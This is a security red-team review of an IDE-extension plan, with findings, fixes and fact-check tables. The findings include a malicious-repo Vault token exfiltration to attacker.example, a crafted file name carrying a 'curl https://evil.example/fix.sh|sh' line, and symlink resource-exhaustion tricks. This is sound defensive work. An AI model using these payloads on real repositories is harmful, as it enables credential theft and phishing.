# Red-team report (draft 1 of the plan, before the Visual Studio re-scope)

# Hostile review: Security Adversary and Fact Checker
Plan: `plans/261014-0750-ide-extension-db-phase`. Repo at HEAD 3975c06. Read-only; nothing was modified.

I report 5 findings. For Phase 3 (MethodNotFound) and Phase 5 (VSIX signing/SBOM) I found nothing that holds up as a security finding; the reasons are under "Checked, no finding".

---

### F1. Phase 4 trusts a repo-chosen file path, and the plan's size and symlink mitigations are wrong
- **Severity:** High
- **Location:** Phase 4, sections "Requirements" (1, 2) and "Risk Assessment & Security Considerations"
- **Flaw and failure scenario:**
  1. **The size limit runs after the whole file is read.** A cloned repo can commit a symlink `Data/AppModelSnapshot.cs -> /dev/zero`, a named pipe, or a 4 GB file. Auto-detect picks it up on every Run Validation. `File.Exists` follows the link and `File.ReadAllTextAsync` reads without limit, so the CLI either runs out of memory or hangs until the host timeout. This hits VS Code, and Visual Studio too, because VS passes `--project <solutionDir>`.
  2. **The scan the plan wants to reuse follows directory symlinks and has no caps.** The plan says to reuse `ResolveEfSnapshotSource` "behaviour identical". That function calls `Directory.EnumerateFiles(root, "*ModelSnapshot.cs", SearchOption.AllDirectories)` with no reparse-point skip and no depth or file-count limit. A committed `vendor -> /` symlink makes it walk the whole disk. It can also pick up a `*ModelSnapshot.cs` from outside the workspace as ground truth.
  3. **The guard the plan wants to borrow does not exist in the form assumed.** The `ProjectCSharpSqlSource` guard (marked [UNVERIFIED] in the plan) only skips *directory* reparse points. It never checks file symlinks and reads files with no size limit.
  4. **Explicit `--ef-snapshot` paths are not confined to the workspace.** Once the option is accepted under `--ide-safe`, any absolute path is read. The two different error messages ("does not exist" vs DG1303 "syntax errors") also tell the caller whether an arbitrary path exists. No file contents leak: non-C# input gives a fixed DG1303 message.
- **Evidence:**
  - `src/DataGuard.Core/Sources/EfModelSource.cs:252`: `var source = await File.ReadAllTextAsync(snapshotFilePath, cancellationToken)`. The limit is only checked later, at `src/DataGuard.Core/Sources/ModelSnapshotCSharpParser.cs:49`: `if (source.Length > options.MaximumSourceBytes)`. That compares UTF-16 chars, not bytes.
  - `src/DataGuard.Cli/Commands/ValidateCommand.cs:568`: `Directory.EnumerateFiles(root, "*ModelSnapshot.cs", SearchOption.AllDirectories)`. Its skip list is only bin/obj/.git (`:569-572`).
  - The repo's own pattern for this, which the scan lacks: `src/DataGuard.Core/AutoDetection/AutoDetectionEngine.cs:523` `AttributesToSkip = FileAttributes.ReparsePoint,` and `:570` `new FileInfo(path).Length > MaximumFileBytes`.
  - `src/DataGuard.Core/Sources/CSharp/ProjectCSharpSqlSource.Discovery.cs:282`: `if ((dirInfo.Attributes & FileAttributes.ReparsePoint) != 0)` (directories only); `src/DataGuard.Core/Sources/ProjectCSharpSqlSource.cs:90-92` `new FileStream(file, ...)` then `reader.ReadToEnd()`.
  - `src/DataGuard.Cli/Commands/ValidateCommand.cs:542-545`: `return (true, explicitSnapshotPath, null);`, with no containment check.
- **Suggested fix:** Replace the Phase 4 Risk bullet 1 with:

  > "EfModelSnapshotLocator is a new bounded walker (NOT a copy of ResolveEfSnapshotSource). It uses `EnumerationOptions { RecurseSubdirectories = true, MaxRecursionDepth = 6, AttributesToSkip = FileAttributes.ReparsePoint, IgnoreInaccessible = true }`, stops after 2000 entries, and skips bin/obj/.git/.vs/node_modules. Before any read, the selected file (auto-detected OR explicit `--ef-snapshot`/`--ef-project` under `--ide-safe`) must: be a regular file (`File.ResolveLinkTarget(path, false) is null`, not a FIFO or device); have `Path.GetFullPath` under the full `--project` root (ordinal prefix check plus separator); and have `FileInfo.Length <= 1 MiB`. `EfModelSource.ExtractFromModelSnapshotWithDiagnosticsAsync` checks `FileInfo.Length` before `ReadAllTextAsync`, and reads through a bounded stream."

  Add these 3.V tests:
  - a symlinked `XModelSnapshot.cs` is ignored;
  - a 2 MiB snapshot gives `ACQUISITION: ... exceeds size limit` with no read;
  - a directory symlink to `/` is not followed;
  - `--ide-safe --ef-snapshot /etc/hostname` gives exit 2 "must be inside --project".

---

### F2. Phase 1 removes one variable but leaves the rest of the credential chain, including Vault token exfiltration via repo config
- **Severity:** High
- **Location:** Phase 1, sections "Key Insights" bullet 5, "Step C", "Tests After" (`buildChildEnvironment ... never touches other keys`), and "Risk Assessment / Bảo mật"
- **Flaw and failure scenario:** For `snapshot refresh` and `baseline` (not ide-safe; the host passes `--config <workspace>/.dataguard.yml`), deleting `DATAGUARD_CONNECTION_STRING` does not leave the CLI without a credential. It just moves resolution further down the chain, to the credential provider. That provider always registers the HashiCorp Vault store and reads `VaultAddress` from the repo-controlled `.dataguard.yml`.
  - **Attack:** a malicious repo commits `VaultAddress: https://attacker.example`. The developer launched VS Code from a shell that has `VAULT_TOKEN`. They click Refresh Snapshot and confirm the modal, which shows no host because no SecretStorage credential exists. The CLI then sends `GET https://attacker.example/v1/secret/data/DatabaseConnection` with header `X-Vault-Token: <token>`.
  - **Phase 1 makes this more likely:** before, an inherited `DATAGUARD_CONNECTION_STRING` short-circuited the chain before the Vault lookup.
  - **Other inherited credentials still reach the child:** `DATAGUARD_DATABASECONNECTION` (provider priority 1), `ConnectionStrings__*`, `AWS_*`, `PGPASSWORD`, `MYSQL_PWD`. The planned test "never touches other keys" would lock that leak in.
- **Evidence:**
  - `src/DataGuard.Core/Security/ZeroTrustCredentialProvider.cs:71`: `stores.Add(new HashiCorpVaultSecretStore(SharedHttpClient));`
  - `src/DataGuard.Core/Security/SecretStores/ISecretStore.cs:133`: `var token = _getEnvironmentVariable("VAULT_TOKEN");`; `:141`: `$"{configuration.VaultAddress!.TrimEnd('/')}/v1/secret/data/..."`; `:144`: `request.Headers.Add("X-Vault-Token", token);`
  - `src/DataGuard.Cli/Services/ConfigLoader.cs:251`: `"VaultAddress" => config with { VaultAddress = value },`. Also `ConfigDocument.cs:51` (the YAML document).
  - `src/DataGuard.Cli/Services/ConfigLoader.cs:111-117`: `secureSource` is only null for `ideSafe || offline`.
  - `src/DataGuard.Cli/CliConfigurationResolver.cs:194`: `|| !string.IsNullOrEmpty(getEnvironmentVariable("DATAGUARD_DATABASECONNECTION"))`
  - The CLI already treats these as secrets: `src/DataGuard.Cli/IdeSafeEnvironment.cs:16-23` (`"VAULT_TOKEN", ... "PGPASSWORD", "MYSQL_PWD"`) and `:61-63` (`AWS_`, `ConnectionStrings__`, `DATAGUARD_*`).
- **Suggested fix:** Replace Step C's env line and the Tests After bullet with:

  > "`buildChildEnvironment(base, connectionString)` removes every name matched by the CLI's `IdeSafeEnvironment.SelectVariablesToClear(allowEnvConnection:false)` rule set: `DATAGUARD_*` except `DATAGUARD_PROVIDER`/`DATAGUARD_CLI_PATH`, `VAULT_TOKEN`, `VAULT_ADDR`, `AWS_*`, `PGPASSWORD`, `MYSQL_PWD`, `ConnectionStrings__*`. It then sets `DATAGUARD_CONNECTION_STRING` only from SecretStorage. The name list lives in `cli-contract.json` (`scrubbedEnvironment`), so `IdeCliContractTests` asserts it equals `IdeSafeEnvironment`'s list (DRY, pinned on both sides)."

  Test: an inherited `VAULT_TOKEN`, `DATAGUARD_DATABASECONNECTION` and `PGPASSWORD` are removed. Optionally, in the CLI, ignore `VaultAddress`/`KeyVaultUri`/`AwsRegion` from a workspace config unless `--allow-secret-store-from-config` is passed. Record that as an open question.

---

### F3. Phase 1's premise about the modal is false, and the change breaks documented behaviour that the plan doesn't update
- **Severity:** Medium
- **Location:** Phase 1, section "Key Insights" bullet 5, and "Related Code Files"
- **Flaw and failure scenario:** The plan says the modal claims "no SecretStorage credential is stored" and is therefore "wrong about the target". In fact the modal explicitly names `DATAGUARD_CONNECTION_STRING` as the target, and a unit test, USAGE and the VS Code README all promise that shell-env fallback.
  - After Phase 1, a developer who relies on the shell variable gets `UNEVALUATED: snapshot refresh requires a database connection` (exit 3).
  - The modal, README and USAGE then describe behaviour that no longer exists.
  - `live-database-confirmation.test.ts:63` still passes, so nothing catches the drift.
- **Evidence:**
  - `src/DataGuard.VSCode/src/live-database-confirmation.ts:100`: `: "the database configured in .dataguard.yml or DATAGUARD_CONNECTION_STRING (no SecretStorage credential is stored)";`
  - `src/DataGuard.VSCode/src/live-database-confirmation.test.ts:63`: `assert.ok(noCredential.includes(".dataguard.yml or DATAGUARD_CONNECTION_STRING"));`
  - `docs/USAGE.md:565` and `src/DataGuard.VSCode/README.md:47`: "(or the connection configured in `.dataguard.yml`/`DATAGUARD_CONNECTION_STRING`)".
- **Suggested fix:** Rewrite Key Insight 5 to say:

  > "The modal advertises the shell `DATAGUARD_CONNECTION_STRING` fallback (`live-database-confirmation.ts:100`). Phase 1 deliberately removes it (credential isolation, F2)."

  Add to Related Code Files (Modify):
  - `src/DataGuard.VSCode/src/live-database-confirmation.ts`: new text "the database configured in .dataguard.yml (no SecretStorage credential is stored; shell credentials are not passed)";
  - `live-database-confirmation.test.ts:63`;
  - `docs/USAGE.md:565`;
  - `src/DataGuard.VSCode/README.md:47`.

  Add a CHANGELOG "Breaking" entry.

---

### F4. Phase 2 puts raw, unsanitised CLI exception text into notifications
- **Severity:** Medium
- **Location:** Phase 2, sections "Requirements" (3, 4) and "Risk Assessment"
- **Flaw and failure scenario:** Requirements 3 and 4 copy a raw stderr line into `showErrorMessage`/`showWarningMessage`. Today no notification ever contains CLI text. The plan's redaction guarantee covers only channel echoes; nothing says notifications are redacted, bounded, or single-line.
  - **Where the text comes from:** the CLI prints driver exception messages with no sanitising, in `UNEVALUATED: contract acquisition failed: {ex.Message}`, `Baseline creation failed: {ex.Message}` and `Snapshot refresh failed: {ex.Message}`.
  - **Redaction gap:** the host redactor misses `User Id=`/`uid=`, which the CLI's own sanitiser covers. Driver messages (for example MySQL's "Access denied for user 'x'@'host'") would show in toasts and persist in the notification centre.
  - **Rule bug in Requirement 3:** for validate/assess, the "first non-JSON stderr line" is always the ack line `ide-safe: active`, so the notification would just say "ide-safe: active". Also, `Validation failed:` lines do not match the `UNEVALUATED:/ACQUISITION:/Error:` prefixes that `firstDiagnosticLine` looks for.
- **Evidence:**
  - `src/DataGuard.Cli/Services/ContractAcquisition.cs:61`: `return new(ContractAcquisitionStatus.Failed, Array.Empty<ContractDescriptor>(), ex.Message);`
  - `src/DataGuard.Cli/Commands/BaselineCommand.cs:105`: `Console.Error.WriteLine($"Baseline creation failed: {ex.Message}");`
  - CLI sanitiser exists but is not applied here: `src/DataGuard.Core/Rules/LiveSqlShapeValidationRule.cs:341`, `@"(?i)\b(password|pwd|user\s*id|uid|secret|token|...`. Host regex `src/DataGuard.VSCode/src/security.ts:4` has no `user id|uid`.
  - Today's notifications are static: `src/DataGuard.VSCode/src/extension.ts:600`: `` `DataGuard ${command} found findings. See Problems or the DataGuard output channel.` ``
  - Ack line is printed first: `src/DataGuard.Cli/Commands/AssessCommand.cs:62`: `Console.Error.WriteLine(IdeSafePolicy.ActiveLine);`
- **Suggested fix:** Add Requirement 6:

  > "Any CLI text placed in a notification passes `redactAndBoundSensitiveText(line, 300)`, is collapsed to one line, has C0/C1 control characters removed, and skips the `ide-safe:` ack and policy lines. The source line is chosen in this order: first `UNEVALUATED:`, then `ACQUISITION:`, then `* failed:`, then `Error:`."

  Extend `SENSITIVE_ASSIGNMENT` (`security.ts:4`) with `user\s*id|uid` to match the CLI sanitiser, and add a red-team case for `contract acquisition failed: ... User Id=sa;Password=x`.

  CLI-side, add: "`ContractAcquisition.cs:61` wraps `ex.Message` in `LiveSqlShapeValidationRule.SanitizeErrorMessage`."

---

### F5. Phase 4 and Phase 2 echo repo-controlled file names into the line protocol the host parses
- **Severity:** Medium
- **Location:** Phase 4, section "Requirements" 1 (`ide-safe: ef model <relative path>`, multi-match `ACQUISITION:` "naming both"); Phase 2, section "Architecture" (`collectRunSignals`)
- **Flaw and failure scenario:** Linux and git allow newlines in file names. A committed file named `a\n{"Kind":"Summary","Data":{"ErrorCount":0}}\nUNEVALUATED: run curl https://evil.example/fix.sh|sh\nModelSnapshot.cs` still matches `*ModelSnapshot.cs`. Once the CLI prints it, each embedded segment becomes its own stderr line.
  - Phase 2's new parser would accept forged `Summary` events or `UNEVALUATED:` lines.
  - Requirement 4 then shows the forged `UNEVALUATED:` text in an error notification, which is a phishing vector.
  - `ACQUISITION: {diagnostic.Path}` already prints paths verbatim.
- **Evidence:**
  - `src/DataGuard.Cli/Commands/ValidateCommand.cs:469`: `Console.Error.WriteLine($"ACQUISITION: {diagnostic.Path}: {diagnostic.Message}");`
  - The host treats any brace-wrapped line as a progress event: `src/DataGuard.VSCode/src/ide-safe-contract.ts:61`: `if (line.startsWith("{") && line.endsWith("}")) {`
- **Suggested fix:** Add to Phase 4 Requirement 1:

  > "The locator ignores candidate paths containing any control character (`char.IsControl`). Every path printed on stderr (`ide-safe: ef model`, `ACQUISITION:`) goes through a CLI helper that escapes control characters (`\n` → `\\n`)."

  Add to Phase 2 Architecture:

  > "`collectRunSignals` accepts at most one `Summary` event, takes it only from a JSON line, and ignores lines that follow a line which failed to parse."

  Test: a fixture file name containing `\n` produces a single escaped stderr line.

---

### Checked, no finding
- **Phase 3, MethodNotFound:** the response only needs `id` (already bounded by the 1 MiB frame limit, `LanguageServer/Program.cs:147`) plus a fixed `-32601` message. Its peer is VS Code, not an attacker. The plan's "MethodNotFound does not echo the payload" wording is enough.
- **Phase 5, signing and SBOM:** no DLL or VSIX Authenticode signing step exists in any workflow (no `signtool` or `AzureSignTool` anywhere in `.github/workflows`). The SBOM step scans the project directory (`marketplace.yml:295-301`, `-b "$env:GITHUB_WORKSPACE\$env:VISUAL_STUDIO_DIR"`), so two extra DLLs are just picked up. Provenance uses `attest-build-provenance` on the whole VSIX (`marketplace.yml:317-321`). `assert-vsix.ps1` checks a minimum list of entries, not an exact set (`:51`). Adding two entries to `$RequiredEntries` changes the gate in 5 workflows (ci, release, installers, marketplace, build_release); that is intended and nothing breaks. No new NuGet package, so the licence allow-list (`ci.yml:73`) is unaffected.

---

## Fact-check table

### Phase 1
| Claim | Real file:line | Verdict |
|---|---|---|
| assess sends `--provider` at `command-args.ts:84` | `command-args.ts:82-83` | Behaviour OK, line off by one |
| `AssessCommand.cs:45-70` registers options | `AssessCommand.cs:22-47` (initializer `:35-47`) | WRONG: `:49-70` is the action |
| `ide-safe: active` at `AssessCommand.cs:85` | `AssessCommand.cs:62` | WRONG: `:85` is the remote-advisories error |
| `--progress` accepted at `AssessCommand.cs:65` | `AssessCommand.cs:45` | WRONG line, behaviour OK |
| `AssessCommand.cs:14` `public static Command Create(CommonOptions)` | `:14` (class is `internal`, `:12`) | OK |
| `ValidateCommand.cs:20` Create | `:20` | OK |
| "every command exposes `Create(CommonOptions)`" | `Program.cs:21,22,27`: `InitCommand.Create()`, `HookCommand.Create()`, `VersionCommand.Create(version)` | WRONG: the factory must special-case these three |
| Root built inline, 13 commands in order | `Program.cs:15-29` | OK |
| Factory extraction from `Program.cs:13-29` | `RegexMatchTimeoutStartup.Apply()` at `Program.cs:7` | Note: the C# test must call it too, or regex bounds differ |
| `OLD_CLI_REJECTION` at `ide-safe-contract.ts:20` | `:20` | OK |
| vscode-extension job is Node-only | `ci.yml:200-225` | OK |
| Core.Tests references Cli | `DataGuard.Core.Tests.csproj:15` | OK |
| InternalsVisibleTo | `DataGuard.Cli.csproj:29` | OK |
| `env: undefined` when no credential | `extension.ts:459-461` | OK |
| CLI reads `DATAGUARD_CONNECTION_STRING` | `CliConfigurationResolver.cs:126` | OK |
| Modal says "no SecretStorage credential" | `live-database-confirmation.ts:98-101` | WRONG: the modal names `.dataguard.yml or DATAGUARD_CONNECTION_STRING` (see F3) |
| Test pins wrong argv | `command-args.test.ts:45-46` | OK |
| System.CommandLine 2.0.12 | `DataGuard.Cli.csproj:24` | OK |
| assess scrubs env under ide-safe | `AssessCommand.cs:71` | OK |
| SDK 9.0.100 / Node 22 | `global.json:3`, `.nvmrc` | OK |

### Phase 2
| Claim | Real file:line | Verdict |
|---|---|---|
| `Warning: no ground truth` line | `ValidateCommand.cs:346` | OK |
| UNEVALUATED acquisition line | `ValidateCommand.cs:309` | OK |
| UNEVALUATED exit 3 at `:478-482` | `ValidateCommand.cs:479-480` | OK, but never under ide-safe (`allowUnevaluated` at `:132`) |
| `ACQUISITION:` lines exist | `ValidateCommand.cs:469` only, format `ACQUISITION: {Path}: {Message}` | OK |
| `Rule X not evaluated:` | `ValidateCommand.cs:364` | OK |
| Summary counts | `ValidateCommand.cs:497-499` | OK |
| `formatProgressLine` at `ide-safe-contract.ts:60-85` | `:56-77` | STALE |
| `formatProgressEvent` at `:91-116` | `:80-~110` | STALE |
| Exit mapping | `extension.ts:596-603` | OK |
| Exception exit 1 | `ValidateCommand.cs:507-515`, `ScanCommand.cs:144-151`, `SnapshotCommands.cs:107-115` | OK |
| `BaselineCommand.cs:260-268` / `:268` | File is 117 lines; real location `:103-111` | WRONG |
| Exit 3 sites | `SnapshotCommands.cs:54-59`, `VerifyShapeCommand.cs:95-100` | OK |
| Exit 4 at `OutputSinks.cs:307` | `src/DataGuard.Cli/Services/OutputSinks.cs:20` (90-line file) | WRONG |
| Raw-error filter | `extension.ts:502-511` | OK |
| Header text | `extension.ts:450` | OK |
| summary.json written | `ValidateCommand.cs:428`; host reads it at `extension.ts:538` | OK |
| SARIF emitted before exit code | `ValidateCommand.cs:412-418` | OK |
| Requirement 3 "first non-JSON stderr line" | Always `ide-safe: active` for validate/assess (`AssessCommand.cs:62`) | LOGIC FLAW (see F4) |
| `redaction.test.ts`, `redaction-redteam.test.ts` exist | `package.json:247` | OK |
| Test script lists files explicitly | `package.json:247` | OK, plan correctly adds `run-outcome` |

### Phase 3
| Claim | Real file:line | Verdict |
|---|---|---|
| Main loop `Program.cs:12-57` | `:11-54` | STALE |
| Range at `:66-72` | `:71` | STALE |
| `code = "DG017"` at `:69` | `:73` | WRONG line |
| `source` at `:70` | `:74` | WRONG line |
| DGSQL001 severity 3 at `:68-71` | `:72-73` | STALE |
| Oversize guard `:146-150` | `:147-150` | OK |
| 8 KiB header limit | `:133` | OK |
| Debounce 150 ms / 1 MiB limit | `:5-6` | OK |
| Keyword-only span | `SqlClassifier.cs:202-203` | OK |
| Literal span available | `SqlClassifier.cs:115-117` (`ContentStart`; `CSharpStringLiteralScanner.cs:16`) | OK |
| Host diag source | `extension.ts:798` | OK |
| `CliProcessTestRunner.cs` exists | `tests/DataGuard.Core.Tests/` | OK |
| `SqlClassifierTests.cs` "create if absent" | Already exists, plus `SqlClassifierPropertyTests.cs` | Note |
| CLI DG017 rule "SelectStarRule…" | `src/DataGuard.Core/Rules/SelectStarUsageRule.cs` | Name differs |
| Exe ProjectReference feasible [UNVERIFIED] | Core.Tests already references Exe `DataGuard.Cli` (`csproj:15`) | RESOLVED: OK |
| `startLanguageServer` / `clearFindingsAndDiagnostics` | `extension.ts:286` / `:271` | OK |
| New `diagnostic-dedupe.test` will run | `package.json:247` lists tests explicitly; Phase 3 does not modify `package.json` | MISSING: the test would never run |
| `extension-host.cjs` DGSQL001 check | `test/extension-host.cjs:26` | OK |

### Phase 4
| Claim | Real file:line | Verdict |
|---|---|---|
| Source-only parse | `EfModelSource.cs:241-253`, `ModelSnapshotCSharpParser.cs:54` | OK |
| "size limit like the existing parser" | Read at `EfModelSource.cs:252` before the check at `ModelSnapshotCSharpParser.cs:49` (counts chars) | WRONG (see F1) |
| EF options rejected | `IdeSafePolicy.cs:188-200` | OK |
| Forced Snapshot mode | `IdeSafePolicy.cs:84-88` | OK |
| `ResolveEfSnapshotSource` | `ValidateCommand.cs:527`; used at `:105`, `:230-232` | OK |
| Reuse scan "behaviour identical" plus caps and node_modules skip | `ValidateCommand.cs:568-572`: no caps, no node_modules, no reparse skip | CONTRADICTION |
| `AutoDetectEFContext` default true | `Configuration.cs:43` | OK |
| Dead stub | `Configuration.cs:206-210` | OK |
| Ground-truth gate counts `EntityDescriptor` | `ValidateCommand.cs:337` | OK |
| README init claim | `README.md:20` | OK |
| Sample uses attributes, no snapshot | `samples/DataGuard.Sample/Order.cs`; no `*ModelSnapshot.cs` | OK |
| Existing test seams | `ModelSnapshotCSharpParserTests.cs`, `IdeSafeHandshakeEndToEndTests.cs` | OK |
| Policy tests "185–396 stay green" | File is 406 lines, but EF rejection pins at `IdeSafePolicyTests.cs:88-90` must be flipped | MISSING from the plan |
| ProjectCSharpSqlSource guard [UNVERIFIED] | Directory-only skip at `Discovery.cs:282`; files read unbounded at `ProjectCSharpSqlSource.cs:90-92` | RESOLVED: insufficient |
| Partial parse won't force exit 3 | `ValidateCommand.cs:132` (`allowUnevaluated` under ide-safe) | OK |
| USAGE lists EF options as rejected | `docs/USAGE.md:208` | Must update (plan covers §--ide-safe) |
| Docs gate script exists | `scripts/verify_docs_sync.sh`; `CLAUDE.md:30` | OK |
| `docs/adr/` exists | Yes | OK |

### Phase 5
| Claim | Real file:line | Verdict |
|---|---|---|
| Summary reads only three counts | `ProgressLineParser.cs:156-158` | OK |
| `[OK] No issues found.` | `ExitCodeExplainer.cs:39` | OK |
| `InitCommand` declared | `Menus.vsct:66`, `:87` | OK |
| No Init handler | `DataGuardPackage.cs:86-91` | OK |
| `InfoBarManager` only constructed in tests | `InfoBarManagerTests.cs:68,90` | OK |
| VSIX includes only two analyzer DLLs | `DataGuard.VisualStudio.csproj:103-110` | OK |
| Manifest analyzer assets | `source.extension.vsixmanifest:30-35` | OK |
| Install target `[17.0,19.0)` | `source.extension.vsixmanifest:12-19` | OK |
| Analyzer dependencies | `ContractValidationAnalyzer.cs:12`, `SqlCallSyntax.cs:11` | OK |
| Roslyn 5.9.0 | `DataGuard.Analyzers.csproj:24` | OK. Also non-private `System.Composition.Hosting 10.0.12` at `:26`, not addressed |
| NuGet package already bundles both DLLs | `DataGuard.Analyzers.csproj:42-45` | OK, supports RC6 |
| `assert-vsix.ps1` required entries | `assert-vsix.ps1:22-29` | OK |
| Test silent pass when no VSIX | `VsixAnalyzerPackagingTests.cs:47-51` | OK |
| VS sets only `DOTNET_ROLL_FORWARD` | `CliArgumentBuilder.cs:133` (`:117-135`) | OK |
| VS assess argv | `CliArgumentBuilder.cs:98-102` | OK |
| Stale overview wording | `overview.md:10` ("without displaying raw output") | OK, wording paraphrased |
| Linux regression gate command | CI parity step is `dotnet msbuild tests/DataGuard.VisualStudio.Tests/DataGuard.VisualStudio.Tests.csproj -restore -t:ResolveProjectReferences ...` (`ci.yml:66`) | WRONG: plan names a different project and target |
| VS jobs on Windows | `ci.yml:253-255`, `:278-279` | OK |
| Signing / SBOM / attestation gate | None / `marketplace.yml:286-301` / `:317-321` | OK, no break |
